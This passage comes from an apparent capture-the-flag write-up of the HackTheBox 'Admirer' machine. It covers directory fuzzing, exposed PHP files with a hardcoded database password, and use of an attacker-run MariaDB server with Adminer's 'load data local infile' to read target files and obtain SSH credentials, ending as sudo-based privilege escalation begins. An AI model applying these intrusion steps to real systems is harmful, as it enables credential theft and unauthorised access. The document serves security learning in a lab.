class="s1">'images/thumbs/thmb_mus02.jpg'</span><span class="p">,</span><span class="s1">'images/fulls/mus02.jpg'</span><span class="p">,</span><span class="s1">'The outcomes of complexity'</span><span class="p">,</span><span class="s1">'Seriously, listen to Dust in Interstellar</span><span class="se">\'</span><span class="s1">s OST. Thank me later.'</span><span class="p">),(</span><span class="mi">7</span><span class="p">,</span><span class="s1">'images/thumbs/thmb_arch01.jpg'</span><span class="p">,</span><span class="s1">'images/fulls/arch01.jpg'</span><span class="p">,</span><span class="s1">'Back to basics'</span><span class="p">,</span><span class="s1">'And centuries later, we want to go back and live in nature... Sort of.'</span><span class="p">),(</span><span class="mi">8</span><span class="p">,</span><span class="s1">'images/thumbs/thmb_mind02.jpg'</span><span class="p">,</span><span class="s1">'images/fulls/mind02.jpg'</span><span class="p">,</span><span class="s1">'We need him back'</span><span class="p">,</span><span class="s1">'He might have been a loner who allegedly slept with a pigeon, but that brain...'</span><span class="p">),(</span><span class="mi">9</span><span class="p">,</span><span class="s1">'images/thumbs/thmb_eng01.jpg'</span><span class="p">,</span><span class="s1">'images/fulls/eng01.jpg'</span><span class="p">,</span><span class="s1">'In the name of Science'</span><span class="p">,</span><span class="s1">'Some theories need to be proven.'</span><span class="p">),(</span><span class="mi">10</span><span class="p">,</span><span class="s1">'images/thumbs/thmb_mus01.jpg'</span><span class="p">,</span><span class="s1">'images/fulls/mus01.jpg'</span><span class="p">,</span><span class="s1">'Equal Temperament'</span><span class="p">,</span><span class="s1">'Because without him, music would not exist (as we know it today).'</span><span class="p">);</span>
<span class="cm">/*!40000 ALTER TABLE `items` ENABLE KEYS */</span><span class="p">;</span>
<span class="n">UNLOCK</span> <span class="n">TABLES</span><span class="p">;</span>
<span class="cm">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */</span><span class="p">;</span>

<span class="cm">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */</span><span class="p">;</span>
<span class="cm">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */</span><span class="p">;</span>
<span class="cm">/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */</span><span class="p">;</span>
<span class="cm">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */</span><span class="p">;</span>
<span class="cm">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */</span><span class="p">;</span>
<span class="cm">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */</span><span class="p">;</span>
<span class="cm">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */</span><span class="p">;</span>

<span class="c1">-- Dump completed on 2019-12-02 20:24:15</span>
</pre></table></code></div></div><p>And i <code class="language-plaintext highlighter-rouge">decompressed</code> the <code class="language-plaintext highlighter-rouge">html.tar.gz</code> file as well</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>➜  admirer <span class="nb">gzip</span> <span class="nt">-d</span> html.tar.gz
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>➜  admirer <span class="nb">tar</span> <span class="nt">-xf</span> html.tar 
</pre></table></code></div></div><p>and i got the file to be <code class="language-plaintext highlighter-rouge">extracted</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>➜  html <span class="nb">ls</span> <span class="nt">-la</span>
total 7188
drwxr-xr-x 6 root     root        4096 May  4 18:19 <span class="nb">.</span>
drwxr-xr-x 4 root     root        4096 May  4 18:19 ..
drwxr-x--- 6 root     www-data    4096 Jun  7  2019 assets
<span class="nt">-rw-r--r--</span> 1 prashant prashant 7321600 May  4 18:06 html.tar
drwxr-x--- 4 root     www-data    4096 Dec  3 05:29 images
<span class="nt">-rw-r-----</span> 1 root     www-data    4613 Dec  4 05:20 index.php
<span class="nt">-rw-r-----</span> 1 root     www-data     134 Dec  2 06:31 robots.txt
drwxr-x--- 2 root     www-data    4096 Dec  3 02:50 utility-scripts
drwxr-x--- 2 root     www-data    4096 Dec  3 02:25 w4ld0s_s3cr3t_d1r
</pre></table></code></div></div><blockquote><p>Now here <code class="language-plaintext highlighter-rouge">comes</code> so <code class="language-plaintext highlighter-rouge">many</code> rabbit holes i ll just skip them because it will make the writeup long</p></blockquote><p>So there are some files in the dir <code class="language-plaintext highlighter-rouge">utility-scripts</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>➜  utility-scripts <span class="nb">ls</span> <span class="nt">-la</span>
total 24
drwxr-x--- 2 root www-data 4096 Dec  3 02:50 <span class="nb">.</span>
drwxr-xr-x 6 root root     4096 May  4 18:19 ..
<span class="nt">-rw-r-----</span> 1 root www-data 1795 Dec  3 02:48 admin_tasks.php
<span class="nt">-rw-r-----</span> 1 root www-data  401 Dec  2 07:28 db_admin.php
<span class="nt">-rw-r-----</span> 1 root www-data   20 Nov 30 04:32 info.php
<span class="nt">-rw-r-----</span> 1 root www-data   53 Dec  3 02:40 phptest.php
</pre></table></code></div></div><blockquote><p>admin_tasks.php</p></blockquote><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;title&gt;</span>Administrative Tasks<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;h3&gt;</span>Admin Tasks Web Interface (v0.01 beta)<span class="nt">&lt;/h3&gt;</span>
  <span class="cp">&lt;?php
  // Web Interface to the admin_tasks script
  // 
  if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /*********************************************************************************** 
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "&lt;br /&gt;", shell_exec("/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1"));
    }
    else
    {
      echo("Invalid task.");
    }
  } 
  ?&gt;</span>

  <span class="nt">&lt;p&gt;</span>
  <span class="nt">&lt;h4&gt;</span>Select task:<span class="nt">&lt;/p&gt;</span>
  <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;select</span> <span class="na">name=</span><span class="s">"task"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">1</span><span class="nt">&gt;</span>View system uptime<span class="nt">&lt;/option&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">2</span><span class="nt">&gt;</span>View logged in users<span class="nt">&lt;/option&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">3</span><span class="nt">&gt;</span>View crontab<span class="nt">&lt;/option&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">4</span> <span class="na">disabled</span><span class="nt">&gt;</span>Backup passwd file<span class="nt">&lt;/option&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">5</span> <span class="na">disabled</span><span class="nt">&gt;</span>Backup shadow file<span class="nt">&lt;/option&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">6</span> <span class="na">disabled</span><span class="nt">&gt;</span>Backup web data<span class="nt">&lt;/option&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">7</span> <span class="na">disabled</span><span class="nt">&gt;</span>Backup database<span class="nt">&lt;/option&gt;</span>
    <span class="nt">&lt;/select&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><blockquote><p>db_admin.php</p></blockquote><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
  <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
  <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"waldo"</span><span class="p">;</span>
  <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"Wh3r3_1s_w4ld0?"</span><span class="p">;</span><span class="nx">ls</span>

  <span class="c1">// Create connection</span>
  <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>

  <span class="c1">// Check connection</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">die</span><span class="p">(</span><span class="s2">"Connection failed: "</span> <span class="o">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">echo</span> <span class="s2">"Connected successfully"</span><span class="p">;</span>


  <span class="c1">// TODO: Finish implementing this or find a better open source alternative</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><blockquote><p><code class="language-plaintext highlighter-rouge">info.php</code></p></blockquote><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span> <span class="cp">?&gt;</span>
</pre></table></code></div></div><blockquote><p>phptest.php</p></blockquote><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">"Just a test to see if PHP works."</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>We cant access the dir called <code class="language-plaintext highlighter-rouge">utility-scripts</code> as response is <code class="language-plaintext highlighter-rouge">403:forbidden</code></p><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-4.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-4.png" alt="Port-80" /></a></p><p>But we can access three files from the <code class="language-plaintext highlighter-rouge">utility-scripts</code></p><blockquote><p>admin_tasks.php</p></blockquote><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-5.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-5.png" alt="Port-80" /></a></p><p>It can run certain kind of tasks but that just a rabbit hole too…left it</p><blockquote><p><code class="language-plaintext highlighter-rouge">info.php</code></p></blockquote><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-6.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-6.png" alt="Port-80" /></a></p><p>And as expected that <code class="language-plaintext highlighter-rouge">phptest.php</code> will print that text</p><h1 id="wfuzz-on-utility-scripts">Wfuzz on utility-scripts</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>➜  admirer wfuzz <span class="nt">-w</span> /usr/share/wordlists/big.txt <span class="nt">-u</span> http://admirer.htb/utility-scripts/FUZZ.FUZ2Z <span class="nt">-z</span> list,php <span class="nt">--hc</span> 403,404  <span class="nt">-c</span>

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.

<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 2.4 - The Web Fuzzer                           <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://admirer.htb/utility-scripts/FUZZ.FUZ2Z
Total requests: 20473

<span class="o">===================================================================</span>
ID           Response   Lines    Word     Chars       Payload                                                                              
<span class="o">===================================================================</span>

000001873:   200        51 L     235 W    4156 Ch     <span class="s2">"adminer - php"</span>  
</pre></table></code></div></div><p>We got a file <code class="language-plaintext highlighter-rouge">adminer.php</code> and that is running with <code class="language-plaintext highlighter-rouge">adminer-database manager</code></p><p>I tried some of the passowrds and usernames that i got from the files but failed</p><p>But when i just google about the <code class="language-plaintext highlighter-rouge">adminer-database manager</code> , i got so many blogs about its vulnerability.</p><p>Here are few</p><blockquote><p><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool" target="_blank">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></p></blockquote><blockquote><p><a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability" target="_blank">https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</a></p></blockquote><p>These are the main that i refered….</p><p>So basically what we need to do configure our <code class="language-plaintext highlighter-rouge">mysql</code> database , allowed remote access of it. and access our database from the <code class="language-plaintext highlighter-rouge">adminer-database manager</code> and then write the proper file in our database from the machine and then access our <code class="language-plaintext highlighter-rouge">database</code> again . and done !!!!</p><h1 id="configuring-mysql">Configuring mysql</h1><p>I am using <code class="language-plaintext highlighter-rouge">maraia-db</code> so all config files will be its.Here are some blogs i used to configure my <code class="language-plaintext highlighter-rouge">maria-db</code> are here.</p><blockquote><p><a href="https://support.rackspace.com/how-to/install-mysql-server-on-the-ubuntu-operating-system/" target="_blank">https://support.rackspace.com/how-to/install-mysql-server-on-the-ubuntu-operating-system/</a></p></blockquote><blockquote><p><a href="https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql</a></p></blockquote><blockquote><p><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql</a></p></blockquote><p>Now its time for configuration.</p><p>I just logged in to my <code class="language-plaintext highlighter-rouge">mysql</code> as root .</p><p>and created called <code class="language-plaintext highlighter-rouge">admirer</code>.</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">CREATE</span> <span class="k">DATABASE</span> <span class="n">admirer</span><span class="p">;</span>
</pre></table></code></div></div><p>and then create a user <code class="language-plaintext highlighter-rouge">demo</code> and give it proper permission to access the database.</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span> <span class="p">(</span><span class="k">User</span><span class="p">,</span><span class="k">Host</span><span class="p">,</span><span class="n">authentication_string</span><span class="p">,</span><span class="n">ssl_cipher</span><span class="p">,</span><span class="n">x509_issuer</span><span class="p">,</span><span class="n">x509_subject</span><span class="p">)</span>
    <span class="o">-&gt;</span> <span class="k">VALUES</span><span class="p">(</span><span class="s1">'demo'</span><span class="p">,</span><span class="s1">'%'</span><span class="p">,</span><span class="n">PASSWORD</span><span class="p">(</span><span class="s1">'demopassword'</span><span class="p">),</span><span class="s1">''</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="s1">''</span><span class="p">);</span>
</pre></table></code></div></div><p>and Save it by</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="n">FLUSH</span> <span class="k">PRIVILEGES</span><span class="p">;</span>
</pre></table></code></div></div><p>and now i selected the db <code class="language-plaintext highlighter-rouge">admirer</code> and give the user appropirate permission for the <code class="language-plaintext highlighter-rouge">database</code>.</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">admirer</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">GRANT</span> <span class="k">ALL</span> <span class="k">PRIVILEGES</span> <span class="k">ON</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span> <span class="k">TO</span> <span class="s1">'demo'</span><span class="o">@</span><span class="s1">'%'</span><span class="p">;</span>
</pre></table></code></div></div><p>and create a table name <code class="language-plaintext highlighter-rouge">test</code> here</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">create</span> <span class="k">table</span> <span class="n">test</span><span class="p">(</span><span class="k">data</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">));</span>
</pre></table></code></div></div><p>And now it done for the <code class="language-plaintext highlighter-rouge">database</code> side , now we need to allow the <code class="language-plaintext highlighter-rouge">remote</code> <strong>access</strong>.</p><p>the file for this configuration is <code class="language-plaintext highlighter-rouge">/etc/mysql/mariadb.conf.d/50-server.cnf</code></p><p>Just set bind_address to 0.0.0.0</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bind-address            <span class="o">=</span> 0.0.0.0
</pre></table></code></div></div><p>Now just restart the service <code class="language-plaintext highlighter-rouge">mysql</code> once and you are good to <code class="language-plaintext highlighter-rouge">go</code>.</p><h1 id="logged-into-the-adminerphp">Logged into the adminer.php</h1><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-8.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-8.png" alt="mysql" /></a></p><p>and i am in</p><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-9.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-9.png" alt="mysql" /></a></p><p>and now in the blog</p><blockquote><p><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool" target="_blank">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></p></blockquote><p>There is video at last that <code class="language-plaintext highlighter-rouge">explains</code> everything that what to <code class="language-plaintext highlighter-rouge">write</code> and where to write.</p><p>now we need to run <code class="language-plaintext highlighter-rouge">sql-command</code> in the <code class="language-plaintext highlighter-rouge">sql command </code> section.</p><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-10.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-10.png" alt="mysql" /></a></p><p>and just write to get that <code class="language-plaintext highlighter-rouge">local.xml</code> file</p><h2 id="writting-data">Writting data</h2><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">load</span> <span class="k">data</span> <span class="k">local</span> <span class="n">infile</span> <span class="s1">'app/data/local.xml'</span>
<span class="k">into</span> <span class="k">table</span> <span class="n">test</span>
<span class="n">fields</span> <span class="n">terminated</span> <span class="k">by</span> <span class="nv">"/n"</span>
</pre></table></code></div></div><p>Run the above <code class="language-plaintext highlighter-rouge">query</code> to write data in the table <code class="language-plaintext highlighter-rouge">test</code>.</p><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-11.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-11.png" alt="sql-command" /></a></p><p>but that <code class="language-plaintext highlighter-rouge">local.xml</code> doesnt exist….lets try with the <code class="language-plaintext highlighter-rouge">index.php</code> of the dir <code class="language-plaintext highlighter-rouge">utility-scripts</code> that was forbidden for us….</p><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-12.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-12.png" alt="sql-command" /></a></p><p>And finally we run the query successfully.</p><p>and just click on select to get the <code class="language-plaintext highlighter-rouge">table</code> content</p><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-13.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-13.png" alt="sql-command" /></a></p><p>And i got <code class="language-plaintext highlighter-rouge">waldo</code> user <code class="language-plaintext highlighter-rouge">password</code>. and i can login with ssh now finally with the creds.</p><h1 id="login-as-waldo">Login as waldo</h1><p><a href="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-14.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/admirer/98dfa6c5-a43b-45a5-9065-3aee2b56876d/image-14.png" alt="login" /></a></p><h1 id="got-usertxt">Got user.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>waldo@admirer:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
c80---------------------------66a
waldo@admirer:~<span class="err">$</span>
</pre></table></code></div></div><h1 id="privilege-escalation-to-root">Privilege escalation to root</h1><p>Root is pretty straight forward</p><p>Running <code class="language-plaintext highlighter-rouge">sudo -l</code> tells us that the user <code class="language-plaintext highlighter-rouge">waldo</code> can run a script</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>waldo@admirer:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>waldo: 
Matching Defaults entries <span class="k">for </span>waldo on admirer:
    env_reset, <span class="nv">env_file</span><span class="o">=</span>/etc/sudoenv, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, <span class="nv">listpw</span><span class="o">=</span>always

User waldo may run the following commands on admirer:
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/admin_tasks.sh
</pre></table></code></div></div><p>and it can set <code class="language-plaintext highlighter-rouge">PATH</code> as <code class="language-plaintext highlighter-rouge">root</code> .</p><blockquote><p>/opt/scripts/admin_tasks.sh</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>waldo@admirer:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/scripts/admin_tasks.sh

<span class="o">[[[</span> System Administration Menu <span class="o">]]]</span>
1<span class="o">)</span> View system <span class="nb">uptime
</span>2<span class="o">)</span> View logged <span class="k">in </span><span class="nb">users
</span>3<span class="o">)</span> View crontab
4<span class="o">)</span> Backup passwd file
5<span class="o">)</span> Backup shadow file
6<span class="o">)</span> Backup web data
7<span class="o">)</span> Backup DB
8<span class="o">)</span> Quit
Choose an option:
</pre></table></code></div></div><p>It has the same <code class="language-plaintext highlighter-rouge">interface</code> that we have on <code class="language-plaintext highlighter-rouge">admin-tasks.php</code> but extended one.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

view_uptime<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/uptime <span class="nt">-p</span>
<span class="o">}</span>

view_users<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/w
<span class="o">}</span>

view_crontab<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/crontab <span class="nt">-l</span>
<span class="o">}</span>

backup_passwd<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/passwd to /var/backups/passwd.bak..."</span>
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        <span class="nb">echo</span> <span class="s2">"Done."</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_shadow<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/shadow to /var/backups/shadow.bak..."</span>
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        <span class="nb">echo</span> <span class="s2">"Done."</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_web<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
        /opt/scripts/backup.py &amp;
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_db<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
